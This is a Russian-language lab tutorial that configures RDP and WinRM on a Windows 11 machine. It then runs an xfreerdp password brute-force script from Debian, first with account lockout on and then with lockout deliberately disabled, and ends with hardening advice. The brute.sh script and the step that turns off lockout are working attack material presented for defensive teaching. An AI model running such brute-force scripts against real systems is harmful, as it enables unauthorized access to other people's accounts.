#### Настройка удалённого доступа

##### Включение RDP через классическую оснастку

Откроем на **Windows 11** диалог **Run** сочетанием **Win + R**, введём **sysdm.cpl** и нажмём **Enter**

![](../../_images/795c68e39ebe.jpg)

Откроется окно **System Properties** - перейдём на вкладку **Remote**. В блоке **Remote Desktop** переключим радиокнопку в положение **Allow remote connections to this computer**. Сразу под ней установите флажок **Allow connections only from computers running Remote Desktop with Network Level Authentication (recommended)** - это включает **NLA**, без которой подключение к серверу будет инициировать тяжёлый графический стек до подтверждения учётных данных. Подтвердите изменения кнопкой **Apply**

![](../../_images/558b9e615724.jpg)

В этом же окне нажмём кнопку **Select Users** - откроется отдельное окно **Remote Desktop Users**. По умолчанию через **RDP** могут заходить только члены локальной группы **Administrators**; для делегирования удалённого входа обычным учётным записям нужно либо добавить их сюда индивидуально, либо добавить специально созданную группу. Группу мы создадим чуть ниже через **PowerShell**, поэтому пока окно закроем кнопкой **OK**

![](../../_images/cacc7f771b7a.jpg)

После применения настроек **Windows** автоматически открывает порт **TCP 3389** в **Windows Defender Firewall** для текущего сетевого профиля и регистрирует встроенные правила группы **Remote Desktop**. Это можно проверить в командной строке - этим займёмся в следующем подразделе.

##### RDP через PowerShell и реестр

То же самое, что мы только что сделали через **GUI**, можно сделать через ключи реестра. Это нужно знать, чтобы автоматизировать настройку **RDP** на десятках машин одной командой и чтобы понимать, какие именно параметры система меняет под капотом.

Главный ключ - **fDenyTSConnections** в ветке **HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server**. Значение **0** означает "удалённые подключения разрешены", **1** - "запрещены". Параметр **UserAuthentication** в подключе **WinStations\RDP-Tcp** включает (**1**) или отключает (**0**) требование **NLA**.

Выполним:

```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
-Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
-Name "UserAuthentication" -Value 1
```

![](../../_images/97d11a83fb74.webp)

Сразу проверим, что значения записаны:

```
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").UserAuthentication
```

![](../../_images/65375215a169.webp)

Первая команда должна вернуть **0**, вторая - **1**.

После активации **RDP** перезагрузим виртуальную машину.

Откроем терминал проверьте порт **TCP 3389**: `Get-NetTCPConnection -LocalPort 3389 -State Listen`

![](../../_images/eaf340591fa2.webp)

В выводе должна появиться строка с **LocalAddress 0.0.0.0** или **::** и **State Listen** - это значит, что система ждёт входящих подключений со всех сетевых интерфейсов. Дополнительно убедимся, что правила брандмауэра для **RDP** включены:

```
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Select-Object DisplayName, Enabled, Direction, Action
```

![](../../_images/77fd5bd8a3c4.webp)

В выводе должны быть несколько правил **Remote Desktop - User Mode (TCP-In)**, **Remote Desktop - User Mode (UDP-In)** и связанные, все со значением **Enabled = True** и **Action = Allow**.

##### Группа удалённого доступа и пользователь rdpuser

Создадим локального пользователя **rdpuser** с заранее известным паролем **rdpuser** - этот же пароль будет лежать на позиции 25 в словаре, по которому мы будем запускать брутфорс. Пароль передаётся объектом **SecureString**:

```
$Password = ConvertTo-SecureString "rdpuser" -AsPlainText -Force
New-LocalUser -Name "rdpuser" `
    -FullName "RDP Test User" `
    -Password $Password `
    -PasswordNeverExpires `
    -AccountNeverExpires
```

![](../../_images/dd511d2c411c.webp)

Затем создадим локальную группу **LabRemoteUsers** для делегирования удалённого доступа и добавьте в неё **rdpuser**:

```
New-LocalGroup -Name "LabRemoteUsers" -Description "Users allowed to connect via RDP"
Add-LocalGroupMember -Group "LabRemoteUsers" -Member "rdpuser"
```

![](../../_images/b8c8871cabc1.webp)

Теперь нужно дать самой группе **LabRemoteUsers** право удалённого входа. Это делается двумя независимыми операциями: добавление в встроенную группу **Remote Desktop Users** (это даёт право на запуск **RDP**-сессии) и - если включена политика **Allow log on through Remote Desktop Services** на конкретные группы - добавление туда же. Для нашего стенда достаточно первого: `Add-LocalGroupMember -Group "Remote Desktop Users" -Member "LabRemoteUsers"`

Проверим, что вложенность сработала:

```
Get-LocalGroupMember -Group "Remote Desktop Users"
Get-LocalGroupMember -Group "LabRemoteUsers"
```

![](../../_images/473217db1cb7.webp)

В выводе первой команды должна быть группа **<имя_компьютера>\LabRemoteUsers**, во второй - пользователь **<имя_компьютера>\rdpuser**.

#### WinRM через PSRemoting

**WinRM** на современной **Windows 11** не включён по умолчанию для произвольных сетевых профилей - его нужно активировать. Это делает командлет **Enable-PSRemoting**, который одной командой настраивает службу **WinRM**, открывает правила брандмауэра и регистрирует слушатель **HTTP** на порту **5985**:

```
Set-NetConnectionProfile -NetworkCategory Private
Enable-PSRemoting -Force
```

![](../../_images/8b25bda953a1.webp)

Флаг **-Force** подавляет интерактивные подтверждения. Сразу после выполнения убедимся, что слушатель действительно поднялся: `Get-ChildItem -Path WSMan:\localhost\Listener\ `

![](../../_images/6f66340851a1.webp)

В выводе должна быть как минимум одна запись с **Keys**, содержащим **Transport=HTTP** и **Port=5985**.

Финальная проверка - попробовать подключиться к **WinRM** локально через **Test-WSMan**: `Test-WSMan -ComputerName localhost`

![](../../_images/66ab876bd49b.webp)

В выводе появится **wsmid** и **ProductVersion** - это значит, что служба отвечает по протоколу **WS-Management**. Дополнительно можно выполнить локальную команду через **WinRM**: `Invoke-Command -ComputerName localhost -ScriptBlock { hostname; whoami }  `

![](../../_images/4fa8467bc9e2.webp)

Команда выполнится через **PSRemoting**-канал и вернёт имя компьютера и текущую учётную запись. Это доказывает, что **WinRM** не просто слушает порт, но и полноценно принимает удалённые команды.

В этой практике используется **HTTP**-слушатель на **5985**. В реальной инфраструктуре правильнее использовать **HTTPS** на **5986** с привязкой к сертификату - это снимает риск перехвата трафика **WinRM**-сессии в открытом виде. Настройка **HTTPS**-слушателя требует отдельного сертификата и относится к смежной теме инфраструктуры сертификатов; здесь мы её не разбираем. Также упомянем, что в **PowerShell 7+** появилась альтернатива - **PSRemoting over SSH** через встроенный **OpenSSH**-сервер **Windows 11**, который тоже даёт защищённый канал управления, но требует отдельной настройки **OpenSSH**.

Узнаем **IP**-адрес **Windows**-машины во внутренней сети для подключения с **Debian**: `Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike 'Loopback' -and $_.IPAddress -notlike '169.*' } | Select-Object InterfaceAlias, IPAddress  `

![](../../_images/50300af2f650.webp)

Запишем адрес второго адаптера (мост) - он понадобится в следующих подразделах. Для примера далее используется **192.168.0.101**.

#### Подготовка машины на Debian

Переключитесь на **Debian 12**. Откроем терминал и установим **FreeRDP 2.10.x** из стандартного репозитория:

```
sudo apt update
sudo apt install -y freerdp2-x11
```

Команда **xfreerdp /version** должна вывести строку вида **This is FreeRDP version 2.10.0** или близкую (2.10.x)

Узнаем **IP**-адрес самой **Debian**-машины во внутренней сети - он нам не нужен для подключения, но пригодится, чтобы понимать топологию: `ip -4 addr show | grep inet`

![](../../_images/23a242c9f626.jpg)

Проверим связь до **Windows**-машины обычным **ping**: `ping -c 4 192.168.0.101`

![](../../_images/f72e4700fe02.jpg)

Если ответы приходят, связь установлена.

##### Sanity-check одиночного RDP-подключения

Прежде чем запускать брутфорс по словарю, убедимся, что **xfreerdp** под **NLA** успешно проходит аутентификацию с правильным паролем. Это маленькая, но критически важная проверка: без неё мы не сможем отличить ситуацию "брутфорс работает, lockout сработал на 10-й попытке" от ситуации "стенд не настроен, xfreerdp падает на **CredSSP**". Выполним на **Debian**: `xfreerdp /v:192.168.0.101 /u:rdpuser /p:'rdpuser' /cert:ignore /sec:nla +auth-only`

![](../../_images/41b8801b1f66.jpg)

Разбор флагов:

- **/v** - адрес целевой машины
- **/u** - имя пользователя
- **/p** - пароль
- **/cert:ignore** - игнорировать самоподписанный сертификат сервера; в учебном стенде это нормально
- **/sec:nla** - принудительно использовать **NLA** через **CredSSP**, отключая откат на старые протоколы
- **+auth-only** - выполнить только аутентификацию и завершиться, не открывая графическое окно сессии

При успешной аутентификации в выводе будет строка **[INFO][com.freerdp.client.x11] - Authentication only**. Это означает, что **CredSSP**-туннель установлен, учётные данные проверены, и сессия успешно бы открылась

#### Брутфорс RDP и роль Account Lockout Policy

##### Проверка дефолтной защиты Account Lockout Policy

Прежде чем что-либо отключать, убедимся, что **Account Lockout Policy** на **Windows 11** действительно работает в дефолте. Начиная со сборки **22528** все четыре параметра политики блокировки включены штатно: **Account lockout threshold** = **10 invalid sign-in attempts**, **Account lockout duration** = **10 minutes**, **Reset account lockout counter after** = **10 minutes**, **Allow Administrator account lockout** = **Enabled**.

Откроем оснастку **secpol.msc** через **Win + R** -> **secpol.msc** -> **OK**. В левой панели разверните **Account Policies** -> **Account Lockout Policy**. В правой панели мы увидми четыре пункта с их текущими значениями.

Подтвердим то же самое в **PowerShell**: `net accounts`

![](../../_images/f2749274249c.webp)

В выводе будет блок, в котором значимые для нас строки - **Lockout threshold**, **Lockout duration (minutes)** и **Lockout observation window (minutes)**. Соответствующие значения - **10**, **10** и **10**. На современной **Windows 11** это и есть штатная защита от брутфорса.

##### Контролируемый брутфорс с включённой защитой

Переключимся на **Debian**. Поместим рядом с домашним каталогом два файла: словарь **rdp_dict.txt** и скрипт **brute.sh** (оба скачаны со страницы практики). Сделайте скрипт исполняемым: `chmod +x brute.sh`

![](../../_images/db1d2f536259.jpg)

Содержимое **brute.sh** простое и прозрачное:

```
#!/bin/bash
TARGET="192.168.0.101"
USER="rdpuser"
DICT="rdp_dict.txt"

i=0
while IFS= read -r pwd; do
    i=$((i+1))
    echo "[*] Attempt #$i: trying password '$pwd'"
    xfreerdp /v:$TARGET /u:$USER /p:"$pwd" /cert:ignore /sec:nla +auth-only >/dev/null 2>&1
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "[+] SUCCESS on attempt #$i: password is '$pwd'"
        echo "Success on attempt $i: $pwd" > /tmp/rdp_success.txt
        exit 0
    fi
done < "$DICT"

echo "[-] Dictionary exhausted without success"
exit 1

```

Скрипт читает словарь построчно, на каждой строке пробует подключиться через **xfreerdp** в режиме **+auth-only**, проверяет exit code. Код **0** означает успешную аутентификацию - скрипт пишет файл-маркер на стороне **Debian** и выходит. Любой ненулевой код означает либо неверный пароль, либо блокировку - скрипт продолжает перебор. Запустим: `./brute.sh`

![](../../_images/0952f8959b81.webp)

На экране мы увидим последовательные попытки: **Attempt #1**, **Attempt #2** и так далее. Каждая попытка занимает несколько секунд - **CredSSP**-handshake небыстрый. После **10**-й неудачной попытки **Windows** регистрирует превышение **Account lockout threshold** и блокирует **rdpuser**. С **11**-й попытки мы не сможем сбрутить RDP уже не из-за неверного пароля, а из-за блокировки учётной записи - даже если в словаре дальше встретится правильный пароль, аутентификация не пройдёт. Через какое-то время **brute.sh** дойдёт до конца словаря и сообщит **Dictionary exhausted without success**.

Переключимся на **Windows** и зафиксируем состояние блокировки: `net user rdpuser`

![](../../_images/7ce8f41820c1.webp)

В выводе обратите внимание на две строки:

**Account active** - **Locked**.

Это первый ключевой вывод практики: **штатная Account Lockout Policy полностью блокирует брутфорс**. Без отключения защиты атакующий упирается в блокировку через 10 попыток, а далее ему остаётся только ждать 10 минут или искать другие векторы.

##### Уязвимая конфигурация: отключение lockout

Теперь намеренно создадим уязвимую конфигурацию - чтобы увидеть, во что превращается брутфорс без защиты. Отключим блокировку через **net accounts**: `net accounts /lockoutthreshold:0`

Значение **0** означает "учётные записи не блокируются никогда". Разблокируем **rdpuser**, чтобы она снова смогла принимать попытки аутентификации: `net user rdpuser /active:yes`

![](../../_images/9ce33f9a9325.webp)

##### Повторный брутфорс без защиты

Вернёмся на **Debian** и снова запустите **brute.sh**: `./brute.sh`

На этот раз ничто не останавливает перебор. На каждой неудачной попытке **xfreerdp** возвращает ошибку, скрипт пробует следующий пароль. На **25**-й попытке в словаре окажется правильный пароль **rdpuser**, туннель установится, **xfreerdp** вернёт **0**, и скрипт напечатает **[+] SUCCESS on attempt #25: password is 'rdpuser'**. Файл-маркер на стороне **Debian** появится в **/tmp/rdp_success.txt**

![](../../_images/8ade91abecc9.jpg)

Теперь, имея найденный пароль, подключитесь к **rdpuser** полноценно, чтобы получить рабочий стол: `xfreerdp /v:192.168.0.109 /u:rdpuser /p:'rdpuser' /cert:ignore /sec:nla /size:800x600`

![](../../_images/7a55f8b274ed.webp)

Откроется отдельное окно с графическим рабочим столом **Windows 11** под учётной записью **rdpuser**. На этом моменте атакующий получил полноценный интерактивный вход - именно это и есть та угроза, ради демонстрации которой брутфорс воспроизводится.

##### Возврат строгой защиты

Завершим **RDP**-сессию **rdpuser** (Close на окне **xfreerdp**) и вернёмся в основную консоль **Windows** под административной учётной записью. Восстановим **Account Lockout Policy**, но **строже дефолта** - порог 5 попыток, длительность 1440 минут, окно сброса счётчика 1440 минут. Это и будет финальное состояние системы: `net accounts /lockoutthreshold:5 /lockoutduration:1440 /lockoutwindow:1440  `

Проверим результат: `net accounts`

![](../../_images/a0a9a32f45fa.webp)

В выводе должно быть **Lockout threshold = 5**, **Lockout duration (minutes) = 1440**, **Lockout observation window (minutes) = 1440**.

#### Что показала демонстрация и как защищать RDP в инфраструктуре

Атака, которую мы только что воспроизвели, классифицируется **MITRE ATT&CK** как **T1110.001** - **Brute Force: Password Guessing**. Её эффективность напрямую зависит от настройки защиты на стороне сервера. Когда **Account Lockout Policy** включена со здравыми параметрами, атакующий получает не более 5 попыток на учётную запись за окно сброса счётчика - перебор по словарю на 60 строк практически бесполезен. Когда политика отключена, тот же словарь добивает до правильного пароля за несколько минут, и атакующий получает рабочий стол.

В реальной инфраструктуре для **RDP** придерживайтесь нескольких базовых принципов. Не выставляйте порт **3389** в публичный интернет напрямую - подключения должны идти либо через **VPN**, либо через **Remote Desktop Gateway** (компонент **Remote Desktop Services**, который проксирует **RDP** через **HTTPS**). Держим **Account Lockout Policy** включённой с порогом **5-10** попыток и окном сброса **15-30** минут - этого хватает, чтобы остановить любые автоматизированные подборщики. **NLA** обязательна на всех узлах: она снимает с сервера нагрузку графического стека до подтверждения учётных данных и делает невозможными атаки на старые уязвимости вроде **BlueKeep**. Смена дефолтного порта **3389** через ключ **PortNumber** в **HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp** не панацея, но отсекает массовые сканирующие ботнеты, которые проверяют только стандартный порт. Ограничим подключения по списку **IP** через **Windows Defender Firewall** - адреса администраторов известны, всё лишнее можно блокировать на уровне сети. И сделаем мониторинг **Event ID 4625** в журнале **Security**: каждое неудачное подключение по **RDP** генерирует это событие с полем **LogonType = 10** (**RemoteInteractive**) - всплеск таких событий с одного **IP** должен триггерить алерт ещё до того, как сработает lockout policy. Детальный разбор работы с журналами и **Event Viewer**.

Для управления через **WinRM** придерживайтесь аналогичных правил: **HTTPS**-слушатель на **5986** вместо **HTTP** **5985**, ограничение по **IP**, мониторинг логов **Microsoft-Windows-WinRM/Operational**. Если есть возможность - используйте **PSRemoting over SSH** через встроенный **OpenSSH**-сервер **Windows 11** как альтернативный защищённый транспорт, особенно для гетерогенных сред с **Linux**-серверами.
